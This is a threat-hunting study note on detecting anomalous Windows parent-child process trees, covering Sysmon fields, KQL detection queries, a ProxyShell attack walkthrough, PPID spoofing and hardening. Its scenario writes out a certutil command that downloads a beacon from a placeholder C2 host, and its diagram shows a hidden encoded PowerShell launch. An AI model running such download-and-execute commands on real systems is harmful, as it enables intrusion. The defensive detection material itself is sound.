---
tags: [threat-hunting, endpoint, windows, sysmon, vapt]
difficulty: intermediate
module: "89 - Endpoint Threat Hunting: Windows, Sysmon, EDR"
topic: "89.10 Identifying Suspicious Parent-Child Process Trees"
---

# 89.10 Identifying Suspicious Parent-Child Process Trees

## Introduction to Process Lineage Analysis

Process execution in the Windows operating system is inherently hierarchical. Every process (the child) is spawned by another process (the parent). This parent-child relationship forms a structural "process tree" or "process lineage."

In endpoint threat hunting and Incident Response, analyzing these relationships is arguably the single most powerful behavioral detection methodology. Attackers, regardless of their sophistication, exploits used, or malware sophistication, eventually have to execute code on the endpoint. When they do, they almost always break the normal, expected process execution patterns of the Windows OS and its installed applications. Understanding what is "normal" allows hunters to immediately spot the anomalous outliers, making this technique effective against zero-day exploits and novel malware.

## Expected vs. Anomalous Process Relationships

Threat hunting relies heavily on the concept of establishing **Legitimate Parent-Child Baselines**. You must know what right looks like to spot the wrong.

### Examples of Normal Process Lineage:
*   **User Interaction:** `explorer.exe` (The Windows Graphical Shell) spawns `chrome.exe` or `winword.exe` (The user double-clicked an icon on the desktop or start menu).
*   **System Services:** `services.exe` (Service Control Manager) spawns `svchost.exe` (Starting a Windows background service).
*   **Application Behavior:** `winword.exe` (Microsoft Word) spawns `splwow64.exe` (The user is printing a document).

### Examples of Anomalous Process Lineage (The Hunt):
When an attacker compromises a system, their initial access mechanisms and subsequent actions create unnatural, highly suspicious lineages.
*   **Phishing/Macro Abuse:** `winword.exe` or `excel.exe` spawns `cmd.exe`, `powershell.exe`, or `wscript.exe`. (A user opening a spreadsheet should *never* necessitate a command prompt or PowerShell execution. This is a massive red flag indicating a malicious macro or exploit).
*   **Exploitation:** `spoolsv.exe` (Print Spooler Service) spawns `cmd.exe`. (This is the classic signature of the PrintNightmare vulnerability exploitation).
*   **Web Shells:** `w3wp.exe` (IIS Web Server worker process), `tomcat8.exe`, or `nginx.exe` spawns `whoami.exe`, `net.exe`, `ping.exe`, or `cmd.exe`. (Web servers should serve web pages, not run system administration commands. This indicates a threat actor interacting with a web shell).

### Key Living-off-the-Land Binaries (LOLBins) in Process Trees
Attackers frequently use native Windows binaries to proxy their execution, bypassing Application Whitelisting (AppLocker) and blending in with normal admin activity. Monitoring the parents and children of these specific LOLBins is critical:
*   **Command Interpreters:** `cmd.exe`, `powershell.exe`, `pwsh.exe`
*   **Execution Proxies:** `rundll32.exe`, `regsvr32.exe`, `mshta.exe`, `wmic.exe`
*   **Script Engines:** `cscript.exe`, `wscript.exe`
*   **Utility Abuse:** `certutil.exe` (used for downloading payloads), `bitsadmin.exe`

### ASCII Diagram: Anomalous Process Tree (Phishing Infection Chain)

```text
+-----------------------+
|  explorer.exe         |  <-- Standard User Shell (Parent of all user interaction)
+-----------+-----------+
            |
            v  (User double-clicks a disguised 'Invoice.docm' email attachment)
+-----------------------+
|  winword.exe          |  <-- Parent Process (Expected application execution)
+-----------+-----------+
            |
            v  (VBA Macro executes shell command)  *** ANOMALY DETECTED ***
+-----------------------+
|  cmd.exe /c           |  <-- Child Process 1 (Word should not spawn cmd.exe)
+-----------+-----------+
            |
            v  (Command Prompt launches PowerShell to bypass execution policies)
+-----------------------+
|  powershell.exe       |  <-- Child Process 2 (Hidden Window, Base64 Encoded Payload)
|  -nop -w hidden -enc  |
+-----------+-----------+
            |
            v  (PowerShell downloads and executes the final binary payload)
+-----------------------+
|  update_agent.exe     |  <-- Malicious Payload (e.g., Cobalt Strike Beacon / Ransomware)
+-----------------------+
```

## Hunting Process Trees with Sysmon

Sysmon **Event ID 1 (Process Creation)** is the absolute foundation for this type of behavioral hunting. It provides not just the execution event, but the critical context needed for lineage analysis, allowing you to reconstruct the execution chain.

### Key Fields in Sysmon Event ID 1
*   **ParentImage:** The full path of the parent executable that spawned the new process (e.g., `C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE`).
*   **ParentProcessId (PPID):** The process ID of the parent. Used to link events together sequentially.
*   **Image:** The full path of the newly spawned process (e.g., `C:\Windows\System32\cmd.exe`).
*   **ProcessId (PID):** The new process ID.
*   **CommandLine:** The exact arguments passed to the executed process (critical for identifying obfuscation or malicious intent).
*   **ParentCommandLine:** What arguments the parent was started with (helps determine if the parent itself was maliciously invoked).

### Advanced Detection Strategies: KQL (Microsoft Sentinel)

```kusto
// 1. Detect Office Applications Spawning Command Interpreters (Macro/Exploit Abuse)
// This is a high-fidelity alert for initial access via phishing.
DeviceProcessEvents
| where InitiatingProcessFileName in~ ("winword.exe", "excel.exe", "powerpnt.exe", "outlook.exe", "msaccess.exe")
| where FileName in~ ("cmd.exe", "powershell.exe", "wscript.exe", "cscript.exe", "mshta.exe", "rundll32.exe", "regsvr32.exe")
| project TimeGenerated, DeviceName, InitiatingProcessFileName, FileName, ProcessCommandLine, AccountName
| sort by TimeGenerated desc
```

```kusto
// 2. Detect Web Servers Spawning Suspicious Recon or Admin Tools (Web Shell Activity)
// Web server processes should not be running system discovery commands.
DeviceProcessEvents
| where InitiatingProcessFileName in~ ("w3wp.exe", "httpd.exe", "nginx.exe", "tomcat8.exe", "java.exe", "php-cgi.exe")
| where FileName in~ ("cmd.exe", "powershell.exe", "whoami.exe", "net.exe", "ipconfig.exe", "ping.exe", "certutil.exe", "tasklist.exe", "systeminfo.exe")
| project TimeGenerated, DeviceName, InitiatingProcessFileName, FileName, ProcessCommandLine, AccountName
```

```kusto
// 3. Detect Anomalous Parent for LSASS.exe (Credential Dumping setup/evasion)
// By design, LSASS should ONLY ever be spawned by wininit.exe during the boot process.
// Any other parent indicates severe system manipulation or a simulated LSASS process.
DeviceProcessEvents
| where FileName =~ "lsass.exe"
| where InitiatingProcessFileName !~ "wininit.exe"
| project TimeGenerated, DeviceName, InitiatingProcessFileName, FileName, ProcessCommandLine
```

```kusto
// 4. Detect LOLBin Execution Chains (Evasion)
// Looking for one LOLBin spawning another, a common technique to confuse simple rules.
DeviceProcessEvents
| where InitiatingProcessFileName in~ ("cmd.exe", "powershell.exe", "mshta.exe", "rundll32.exe")
| where FileName in~ ("mshta.exe", "powershell.exe", "wscript.exe", "certutil.exe")
| where ProcessCommandLine has_any ("http", "https", "-enc", "-w hidden")
| project TimeGenerated, DeviceName, InitiatingProcessFileName, FileName, ProcessCommandLine
```

## Real-World Attack Scenario

### Exploiting an Unpatched Web Server (ProxyShell/ProxyLogon)
During the massive ProxyShell and ProxyLogon exploitation campaigns targeting Microsoft Exchange servers globally, attackers leveraged unauthenticated vulnerabilities to drop web shells and execute arbitrary commands with `SYSTEM` privileges.

**Detailed Attack Flow & Process Telemetry:**

1.  **Exploitation:** The attacker sent a crafted HTTPS request to the Exchange server. The underlying vulnerability caused the IIS worker process responsible for the Exchange web interface (`w3wp.exe`) to execute the attacker's initial payload.
2.  **Web Shell Execution & Recon:** The attacker used the newly dropped web shell to conduct initial system reconnaissance to understand their environment.
    *   **Telemetry Alert:** `w3wp.exe` (Parent) spawned `cmd.exe /c whoami` (Child). This is a massive anomaly. IIS worker processes should rarely, if ever, spawn interactive command prompts.
3.  **Payload Staging:** The attacker needed to download a Cobalt Strike beacon to establish a more stable C2 channel.
    *   **Telemetry Alert:** `w3wp.exe` spawned `cmd.exe` which subsequently spawned `certutil.exe -urlcache -split -f http://malicious.c2/beacon.exe C:\temp\b.exe`.
4.  **Lateral Movement Prep:** The attacker used native Windows tools to dump credentials for lateral movement.
    *   **Telemetry Alert:** `w3wp.exe` spawned `powershell.exe` -> executed an obfuscated script -> injected into a newly spawned `rundll32.exe` to run memory dumping operations against `lsass.exe`.
    *   *Hunting Context:* The entire execution chain, regardless of how obfuscated the PowerShell was, rooted back to the anomalous `w3wp.exe` parent, isolating the source of the breach instantly.

## Advanced Evasion Techniques: Parent Process ID (PPID) Spoofing

Sophisticated attackers (and modern C2 frameworks like Cobalt Strike) are highly aware that defenders rely on process tree analysis. To defeat this, they utilize **PPID Spoofing**.

When an attacker's malware calls the Windows API `CreateProcess` to spawn a new process (like `powershell.exe` for a payload), they can use the `UpdateProcThreadAttribute` API to explicitly supply an arbitrary, different process as the "parent".

**Example of PPID Spoofing:**
An attacker has a beacon running inside a compromised `notepad.exe` process. They want to spawn `powershell.exe` to run a post-exploitation script.
*   *Without Spoofing:* Telemetry shows `notepad.exe -> powershell.exe`. This is highly suspicious and easily caught.
*   *With Spoofing:* The attacker uses APIs to tell the OS: "Spawn `powershell.exe`, but make it look like `explorer.exe` spawned it."
To the EDR and Sysmon, the telemetry will log `explorer.exe -> powershell.exe`. This is a much more natural, albeit noisy, baseline, potentially evading basic parent-child detection rules.

**Detecting PPID Spoofing:**
While Sysmon Event ID 1 shows the *reported* parent, advanced hunting requires comparing the reported parent with the true execution context.
*   **Cross-Referencing Telemetry:** Advanced EDRs track the true creator process (the process that actually called `CreateProcess`) versus the spoofed parent.
*   **Event Tracing for Windows (ETW):** Utilizing ETW providers (specifically `Microsoft-Windows-Kernel-Process`) which operate closer to the kernel, bypass user-mode API spoofing, and reveal the true thread creator.

## Mitigation and Hardening Strategies

*   **Attack Surface Reduction (ASR) Rules:** Implement strict ASR rules. The most impactful rules for process lineage include:
    *   "Block all Office applications from creating child processes"
    *   "Block Adobe Reader from creating child processes"
    This outright prevents the most common phishing infection chains regardless of the specific payload or obfuscation used.
*   **Application Whitelisting (AppLocker/WDAC):** Use Windows Defender Application Control to prevent unauthorized binaries from executing, limiting the attacker's ability to spawn secondary stages or drop new executables.
*   **Continuous Baselining:** Environment baselining is mandatory for process tree hunting. A hunter must know what developers, sysadmins, and standard users normally execute to separate the signal from the noise. Exclusions should be based on hash, path, and signer, not just filename.

## Chaining Opportunities
- **Initial Access:** Identifying macro abuse through `winword.exe -> cmd.exe` lineage is the first link in the chain.
- **Execution & Defense Evasion:** Spotting LOLBin proxies chaining together, e.g., `explorer.exe -> mshta.exe -> powershell.exe`.
- **Privilege Escalation:** Noticing a low-privilege process tree suddenly spawning a high-privilege `SYSTEM` process (e.g., via a scheduled task trigger anomaly where `svchost.exe` spawns a malicious payload as SYSTEM).

## Related Notes
- [[06 - Hunting for WMI Abuse and Persistence]]
- [[07 - Detecting Malicious Scheduled Tasks and Services]]
- [[08 - Hunting for Registry Modifications and Run Keys]]
- [[09 - Detecting Credential Dumping LSASS Access]]
